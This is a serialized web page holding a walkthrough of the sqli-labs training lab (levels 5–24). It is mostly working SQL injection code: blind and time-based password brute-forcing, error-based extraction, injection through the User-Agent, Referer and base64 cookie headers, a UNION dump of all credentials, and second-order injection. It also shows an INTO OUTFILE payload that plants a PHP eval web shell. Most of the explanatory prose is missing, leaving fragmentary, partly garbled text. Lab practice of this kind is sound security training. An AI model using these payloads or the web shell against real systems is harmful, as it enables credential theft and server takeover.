AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \"\n        resp = query_get(\"Less-9\", payload)\n        if len(resp.text) == 707:\n            return i\n    return None\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$17"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L10"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"print(len(query_get(\"Less-10\", '?id=1\" AND 1=0 -- ').text))  # 746\nprint(len(query_get(\"Less-10\", '?id=1\" AND 1=1 -- ').text))  # 709\n\n\ndef brute_force(pos):\n    for i in range(32, 127):\n        payload = f'?id=1\" AND ascii(substr((SELECT password FROM security.users WHERE username=\"Angelina\"),{pos},1))={i} -- '\n        resp = query_get(\"Less-10\", payload)\n        if len(resp.text) == 709:\n            return i\n    return None\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$18"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L5-L6"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L5L6L5"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=1' OR updatexml(null,concat(0x7e,(SELECT password FROM security.users WHERE username='Angelina'),0x7e),null) -- \"\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=1' OR updatexml(null,concat(0x7e,(SELECT password FROM security.users WHERE username='Angelina'),0x7e),null) -- \"</span>\n"}}]}]]}],["$","$L10",null,{"src":"L5.jpg","width":"100%"}],["$","h3",null,{"className":"x-h2","children":"L7"}],["$","div",null,{"className":"x-highlightblock highlight-background-golden","children":[["$","h4",null,{"className":"x-h3","children":""}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">secure_file_priv</code><code class=\"x-inline-highlight\">NULL</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"mysql> show variables like 'secure_file_priv';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv | NULL  |\n+------------------+-------+\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"mysql> show variables like 'secure_file_priv';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv | NULL  |\n+------------------+-------+\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"PHPStudy<code class=\"x-inline-highlight\">PHPStudy\\Extensions\\MySQL5.7.26\\my.ini</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"[mysqld]\n...\nsecure_file_priv=\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"[mysqld]\n...\nsecure_file_priv=\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">[mysqld]</code><code class=\"x-inline-highlight\">secure_file_priv=</code>MySQL"}}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"... UNION SELECT 1,2,hex(load_file('/path/to/file')) --"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>hex<span class=\"token punctuation\">(</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'/path/to/file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">--</span>"}}]}]]}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"MySQL<code class=\"x-inline-highlight\">INTO OUTFILE</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"... UNION SELECT 1,2,0x68656c6c6f INTO OUTFILE '/path/to/file' --"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68656c6c6f</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/path/to/file'</span> <span class=\"token comment\">--</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">/path/to/file</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"1   2   hello"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"1   2   hello"}}]}]]}]]}]]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">WWW</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"root = r\"C:\\\\path\\\\to\\\\WWW\\\\sqli-labs\\\\Less-7\\\\\"\n\nshell = '<?php @eval($_GET[\"cmd\"]); ?>'\nshell_hex = \"0x\" + shell.encode().hex()\nshell_path = root + \"shell.php\"\n\npayload = f\"?id=x')) UNION SELECT '','',{shell_hex} INTO OUTFILE '{shell_path}' -- \"\nprint(payload)\n# ?id=x')) UNION SELECT '','',0x3c3f70687020406576616c28245f4745545b22636d64225d293b203f3e INTO OUTFILE '...' --\n\nquery_get(\"Less-7\", payload)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$19"}}]}]]}],["$","$L10",null,{"src":"L7.jpg","width":"100%"}],["$","h2",null,{"className":"x-h1","children":"L11-L16"}],["$","h3",null,{"className":"x-h2","children":" & "}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"LabSQL"}}],["$","h3",null,{"className":"x-h2","children":"L11"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x' OR 1=1 -- \"\nresp = query_post(\"Less-11\", data={\"uname\": payload, \"passwd\": \"x\"})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x' OR 1=1 -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-11\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"uname\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">,</span> <span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L12"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = 'x\") OR 1=1 -- '\nresp = query_post(\"Less-12\", data={\"uname\": payload, \"passwd\": \"x\"})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">'x\") OR 1=1 -- '</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-12\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"uname\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">,</span> <span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L13"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x') OR 1=1 -- \"\nresp = query_post(\"Less-13\", data={\"uname\": payload, \"passwd\": \"x\"})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x') OR 1=1 -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-13\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"uname\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">,</span> <span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L14"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = 'x\" OR 1=1 -- '\nresp = query_post(\"Less-14\", data={\"uname\": payload, \"passwd\": \"x\"})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">'x\" OR 1=1 -- '</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-14\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"uname\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">,</span> <span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L15"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L15"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from query import *\nimport requests\n\npayloads = [\n    'x\"   OR sleep(10) -- ',\n    'x\")  OR sleep(10) -- ',\n    'x\")) OR sleep(10) -- ',\n    \"x'   OR sleep(10) -- \",\n    \"x')  OR sleep(10) -- \",\n    \"x')) OR sleep(10) -- \",\n]\n\nfor payload in payloads:\n    try:\n        query_post(\"Less-15\", data={\"uname\": payload, \"passwd\": \"x\"}, timeout=3)\n    except requests.exceptions.Timeout:\n        print(\"[*] Vulnerable payload:\", payload)\n# [*] Vulnerable payload: x'   OR sleep(10) --\n\npayload = \"x' OR 1=1 -- \"\nresp = query_post(\"Less-15\", data={\"uname\": payload, \"passwd\": \"x\"})\nprint(resp.text)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1a"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L16"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L16<code class=\"x-inline-highlight\">\")</code>"}}],["$","h2",null,{"className":"x-h1","children":"L17-L22"}],["$","h3",null,{"className":"x-h2","children":"L17"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L17<code class=\"x-inline-highlight\">admin</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$update = \"UPDATE users SET password='$passwd' WHERE username='$row1'\";"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$update</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"UPDATE users SET password='<span class=\"token interpolation\"><span class=\"token variable\">$passwd</span></span>' WHERE username='<span class=\"token interpolation\"><span class=\"token variable\">$row1</span></span>'\"</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) -- \"\nresp = query_post(\"Less-17\", data={\"uname\": \"admin\", \"passwd\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-17\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"uname\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab"}}],["$","h3",null,{"className":"x-h2","children":"L18"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L18<code class=\"x-inline-highlight\">admin:admin</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$uagent = $_SERVER['HTTP_USER_AGENT'];\n// ...\n$insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$uagent</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_USER_AGENT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// ...</span>\n<span class=\"token variable\">$insert</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class=\"token interpolation\"><span class=\"token variable\">$uagent</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$IP</span></span>', <span class=\"token interpolation\"><span class=\"token variable\">$uname</span></span>)\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x', 0, updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #\"\nresp = query_post(\"Less-18\", data={\"uname\": \"admin\", \"passwd\": \"admin\"}, headers={\"User-Agent\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1b"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">payload</code><code class=\"x-inline-highlight\">User-Agent</code>Header<code class=\"x-inline-highlight\">--</code><code class=\"x-inline-highlight\">#</code>"}}],["$","h3",null,{"className":"x-h2","children":"L19"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$referrer = $_SERVER['HTTP_REFERER'];\n// ...\n$insert = \"INSERT INTO `security`.`referers` (`referers`, `ip_address`) VALUES ('$referrer', '$IP')\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$referrer</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_REFERER'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// ...</span>\n<span class=\"token variable\">$insert</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO `security`.`referers` (`referers`, `ip_address`) VALUES ('<span class=\"token interpolation\"><span class=\"token variable\">$referrer</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$IP</span></span>')\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">&#36;uagent = &#36;_SERVER['HTTP_REFERER'];</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x', updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #\"\nresp = query_post(\"Less-19\", data={\"uname\": \"admin\", \"passwd\": \"admin\"}, headers={\"Referer\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1c"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L20"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Cookie"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$cookee = $_COOKIE['uname'];\n$sql = \"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$cookee</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username='<span class=\"token interpolation\"><span class=\"token variable\">$cookee</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #\"\nresp = query_post(\"Less-20\", data={\"uname\": \"admin\", \"passwd\": \"admin\"}, cookies={\"uname\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1d"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L21"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"CookieBase64"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$cookee = $_COOKIE['uname'];\n$cookee = base64_decode($cookee);\n$sql = \"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$cookee</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cookee</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cookee</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username=('<span class=\"token interpolation\"><span class=\"token variable\">$cookee</span></span>') LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x') OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #\"\npayload = base64.b64encode(payload.encode()).decode()\nresp = query_post(\"Less-21\", data={\"uname\": \"admin\", \"passwd\": \"admin\"}, cookies={\"uname\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1e"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L22"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$cookee = $_COOKIE['uname'];\n$cookee = base64_decode($cookee);\n$cookee1 = '\"' . $cookee . '\"';\n$sql = \"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1f"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = 'x\" OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #'\npayload = base64.b64encode(payload.encode()).decode()\nresp = query_post(\"Less-22\", data={\"uname\": \"admin\", \"passwd\": \"admin\"}, cookies={\"uname\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$20"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"L23-28"}],["$","h3",null,{"className":"x-h2","children":"L23"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = $_GET['id'];\n$reg = \"/#/\";\n$reg1 = \"/--/\";\n$replace = \"\";\n$id = preg_replace($reg, $replace, $id);\n$id = preg_replace($reg1, $replace, $id);\n$sql = \"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$21"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQL"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\"</span>"}}]}]]}],["$","$L10",null,{"src":"L23.jpg","width":"100%"}],["$","h3",null,{"className":"x-h2","children":"L24"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L24<code class=\"x-inline-highlight\">mysql_escape_string</code><code class=\"x-inline-highlight\">mysql_real_escape_string</code>"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$username = mysql_escape_string($_POST['username']);\n// ...\n$sql = \"INSERT INTO users (username, password) VALUES (\\\"$username\\\", \\\"$pass\\\")\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// ...</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO users (username, password) VALUES (\\\"<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>\\\", \\\"<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>\\\")\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">admin' #</code><code class=\"x-inline-highlight\">123</code><code class=\"x-inline-highlight\">mysql_escape_string</code><code class=\"x-inline-highlight\">admin&#92;' #</code><code class=\"x-inline-highlight\">$sql</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"INSERT INTO users (username, password) VALUES (\"admin\\' #\", \"123\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> users <span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"admin\\' #\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","$L10",null,{"src":"L24-1.jpg"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">$_SESSION[\"username\"]</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$username = $_SESSION[\"username\"];\n$curr_pass = mysql_real_escape_string($_POST['current_password']);\n$pass = 